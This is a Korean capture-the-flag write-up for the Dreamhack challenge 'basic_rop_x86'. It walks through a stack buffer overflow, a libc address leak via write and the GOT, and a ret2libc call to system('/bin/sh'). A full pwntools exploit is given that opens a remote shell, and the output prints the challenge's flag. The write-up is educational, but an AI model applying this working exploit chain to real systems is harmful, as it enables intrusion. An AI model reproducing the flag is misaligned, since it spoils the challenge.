https://teberr.notion.site/basic_rop_x86-b6651a5682a342fe91eb57a9083b5195

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e6731141-a5ae-48b6-90c6-e2b60e0eb51e/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

문제파일을 다운로드 받으면 basic_rop_x86.c 소스코드 파일과basic_rop_x86파일 및 라이브러리를 획득할 수 있다. 

# 코드 분석 및 공격 설계

보호기법을 확인해보자.

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

32비트 환경이며 보호기법은 카나리가 존재하지 않고 NX비트가 적용되어 스택에서 실행권한이 없는 것을 확인할 수 있다. RELRO는 부분적으로 적용되어있다. 즉 보호기법은 적용되어 있지 않으므로 고려하지 않아도 된다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

main함수에서 사용한 배열 buf의 크기는 0x40이지만 사용자로 부터 입력을 받는 read함수를 보면 buf의 크기보다 큰 0x400만큼 입력을 받아 버퍼 오버플로우가 발생한다.

write 함수는 fd가 1이면 표준 출력으로 화면에 출력을 해주는 함수이다.

gdb로 main 함수를 디버깅하면 아래와 같다.

```solidity
Dump of assembler code for function main:
   0x080485d9 <+0>:     push   ebp
   0x080485da <+1>:     mov    ebp,esp
   0x080485dc <+3>:     push   edi
   0x080485dd <+4>:     sub    esp,0x40
   0x080485e0 <+7>:     lea    edx,[ebp-0x44]
   0x080485e3 <+10>:    mov    eax,0x0
   0x080485e8 <+15>:    mov    ecx,0x10
   0x080485ed <+20>:    mov    edi,edx
   0x080485ef <+22>:    rep stos DWORD PTR es:[edi],eax
   0x080485f1 <+24>:    call   0x8048592 <initialize>
   0x080485f6 <+29>:    push   0x400
   0x080485fb <+34>:    lea    eax,[ebp-0x44]
   0x080485fe <+37>:    push   eax
   0x080485ff <+38>:    push   0x0
   0x08048601 <+40>:    call   0x80483f0 <read@plt>
   0x08048606 <+45>:    add    esp,0xc
   0x08048609 <+48>:    push   0x40
   0x0804860b <+50>:    lea    eax,[ebp-0x44]
   0x0804860e <+53>:    push   eax
   0x0804860f <+54>:    push   0x1
   0x08048611 <+56>:    call   0x8048450 <write@plt>
   0x08048616 <+61>:    add    esp,0xc
   0x08048619 <+64>:    mov    eax,0x0
   0x0804861e <+69>:    mov    edi,DWORD PTR [ebp-0x4]
   0x08048621 <+72>:    leave  
   0x08048622 <+73>:    ret
```

위 main에서 오프닝을 보면 아래와 같다.

```solidity
   0x080485d9 <+0>:     push   ebp
   0x080485da <+1>:     mov    ebp,esp
   0x080485dc <+3>:     push   edi
   0x080485dd <+4>:     sub    esp,0x40
   0x080485e0 <+7>:     lea    edx,[ebp-0x44]
```

이를 바탕으로 스택 구조를 살펴보면 아래와 같이 구성되어 있다.

![스택구조.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f736b04d-b041-42a2-bfa1-3d03c652561b/%EC%8A%A4%ED%83%9D%EA%B5%AC%EC%A1%B0.png)

즉 버퍼오버플로우를 통해서 함수 종료 후 실행될 ret 주소를 덮어씌우기 위해서는 BUF에서 총 0x48바이트만큼 덮어씌운 후에 원하는 주소로 덮어씌우면 된다.

`payload = b'A'*0x40 + b'B' *0x8` 이 이번 문제의 버퍼 오버 플로우의 기본 골자가 된다.

이제 어떠한 방식으로 system(”/bin/sh”)를 이용하여 쉘을 획득할지 생각해야 한다.

system 함수가 문제에서 사용되지 않았기 때문에 라이브러리에서 system 함수의 주소를 찾아야 system 함수로 리턴 시킬 수 있다.

이번 문제에서는 libc.so.6 라이브러리를 사용하기 때문에 이미 사용하고 있는 read함수의 got와libc.so.6에서의 read함수 오프셋을 이용해서 libc.so.6의 베이스 주소를 구한 후 system 함수의 오프셋을 더해 system함수의 주소를 알아내고자 한다. 

함수의 got주소는 ELF(파일명).got 를 이용하여 그 파일에서 got의 주소를 구할 수 있고 라이브러리 오프셋은 ELF(라이브러리명).symbols 를 이용하여 구할 수 있다. 

즉 system 함수가 rop_basic_x86 파일이 실행되었을 때 라이브러리 상 어디 주소에 있는지 알기 위해서는 다음과 같은 과정을 거쳐야 한다.

1. read 함수(이미 불러졌던 함수)의 got 주소로 찾아가 got에 적혀있는 주소를 알아낸다. (라이브러리에 있는 read함수의 주소)
2. 그러면 라이브러리에 있는 read 함수의 주소를 알아냈으므로 이 값에서 라이브러리 read 함수 오프셋을 빼주면 라이브러리의 베이스 주소가 나온다.
3. 이 라이브러리 베이스 주소에서 라이브러리 system 오프셋을 더하면 system 함수의 라이브러리상 주소를 알 수 있다.

write 함수를 이용해 system 함수의 주소를 leak 시킬 것이다.

32비트 아키텍쳐는 특성상 매개변수가 스택에 존재하고 pop을 통해 꺼내어 함수를 실행한다. write함수는 매개변수가 세개이므로 pop pop pop ret 가젯을 찾아야 한다. 

```bash
┌──(root💀kali)-[~/바탕화면/basic_rop_86]
└─# ROPgadget --binary ./basic_rop_x86 | grep "pop"                                      1 ⨯
0x080483d4 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x08048685 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483d6 : add esp, 8 ; pop ebx ; ret
0x0804869f : arpl word ptr [ecx], bx ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x08048684 : jecxz 0x8048609 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08048683 : jne 0x8048668 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483d2 : lcall 0x8c4:0x83000000 ; pop ebx ; ret
0x080483d7 : les ecx, ptr [eax] ; pop ebx ; ret
0x08048686 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08048687 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x0804868b : pop ebp ; ret
0x08048688 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483d9 : pop ebx ; ret
0x0804868a : pop edi ; pop ebp ; ret
0x08048689 : pop esi ; pop edi ; pop ebp ; ret
```

pop ret 가젯은 0x080483d9 에

pop pop pop ret 가젯은 0x08048689에 있는 것을 볼 수 있다.

```python
from pwn import *

host="host3.dreamhack.games"
port=20485
p=remote(host,port)
#p=process('./basic_rop_x86')

e=ELF('./basic_rop_x86')
library = ELF('./libc.so.6') # 라이브러리 불러오기
#library = e.libc

write_plt = e.plt['write']
read_plt = e.plt['read']
read_got = e.got['read']
main= e.symbols['main']

pppr = 0x08048689  # pop pop pop ret gadget
pr = 0x080483d9 # pop ret gadget
payload = b'A'*0x40 + b'B' *0x8

#write(1,read_got,0x40)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(0x40)
payload += p32(main)

p.send(payload)
p.recvuntil(b'A'*0x40)

read_library = u32(p.recvn(4)) # 출력된 read의 라이브러리상 주소 저장
library_base = read_library - library.symbols['read']
system_library = library_base + library.symbols['system']
```

write_plt가 실행되면 pop pop pop ret이 실행되며 매개변수 1,read_got,0x40을 넣어 write_plt를 실행한다.

따라서 read_got에 있는 주소값이 출력이 되고 이를 recvn(4)로 4바이트만큼 받아서 u32로 저장하여 system_library 의 주소를 구한다.

이제 system_library의 주소를 구하였으므로 “/bin/sh” 문자열의 라이브러리에서의 오프셋도 구해보면 

```solidity
┌──(root💀kali)-[~/바탕화면/basic_rop_86]
└─# strings -tx libc.so.6 | grep "/bin/sh"
 15902b /bin/sh
```

15902b이므로 이를 library_base에 더하면 “/bin/sh”의 위치가 나온다.

```python
from pwn import *

host="host3.dreamhack.games"
port=20485
p=remote(host,port)
#p=process('./basic_rop_x86')

e=ELF('./basic_rop_x86')
library = ELF('./libc.so.6') # 라이브러리 불러오기
#library = e.libc

write_plt = e.plt['write']
read_plt = e.plt['read']
read_got = e.got['read']
main= e.symbols['main']

pppr = 0x08048689  # pop pop pop ret gadget
pr = 0x080483d9 # pop ret gadget
payload = b'A'*0x40 + b'B' *0x8

#write(1,read_got,0x40)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(0x40)
payload += p32(main)

p.send(payload)
p.recvuntil(b'A'*0x40)

read_library = u32(p.recvn(4)) # 출력된 read의 라이브러리상 주소 저장
library_base = read_library - library.symbols['read']
system_library = library_base + library.symbols['system']

bin_sh_offset= 0x15902b
bin_sh= library_base + bin_sh_offset
print("system:",hex(system_library))
print("bin_sh:",hex(bin_sh))

payload2 = b'A'*0x40 + b'B'*0x8
payload2 += p32(system_library)
payload2 += p32(pr)
payload2 += p32(bin_sh)

p.send(payload2)
p.recvuntil(b'A'*0x40)

p.interactive()

```

system 함수와 문자열 “/bin/sh”의 위치를 알기 때문에 main으로 돌아가서 다시 사용자 입력을 받아 실행될 ret 주소를 system으로 그리고 매개변수를 pop ret을 이용하여 /bin/sh로 설정해준다.

```solidity
┌──(root💀kali)-[~/바탕화면/basic_rop_86]
└─# python3 ./answer.py
[+] Opening connection to host3.dreamhack.games on port 20485: Done
[*] '/root/바탕화면/basic_rop_86/basic_rop_x86'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/root/바탕화면/basic_rop_86/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
system: 0xf7dde940
bin_sh: 0xf7efd02b
[*] Switching to interactive mode
$ ls
basic_rop_x86
flag
$ cat flag
DH{ff3976e1fcdb03267e8d1451e56b90a5}[*] Got EOF while reading in interactive
$
```

실행하면 익스플로잇이 정상적으로 작동하여 쉘을 얻었고 flag 값`DH{ff3976e1fcdb03267e8d1451e56b90a5}`을 얻을 수 있다.
